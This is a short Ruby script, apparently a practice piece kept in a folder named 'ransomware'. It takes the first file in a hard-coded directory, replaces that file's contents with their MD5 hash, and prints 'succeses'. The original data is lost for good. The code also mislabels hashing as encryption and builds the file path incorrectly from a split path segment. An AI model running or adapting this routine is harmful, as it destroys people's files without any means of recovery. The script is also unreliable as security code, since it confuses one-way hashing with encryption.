require 'digest'

def md5_hashing(file_name)
  encrypoted= Digest::MD5.file(file_name).hexdigest
  File.open(file_name, "w+"){ |file| file.write(encrypoted)}
  p "succeses"
end

temp_path= "/workspaces/ruby-on-rails/mini-project/ransomware"
files= Dir["#{temp_path}/*"]
file_name= files[0]
path_str_list= file_name.split("/")
md5_hashing(path_str_list[5])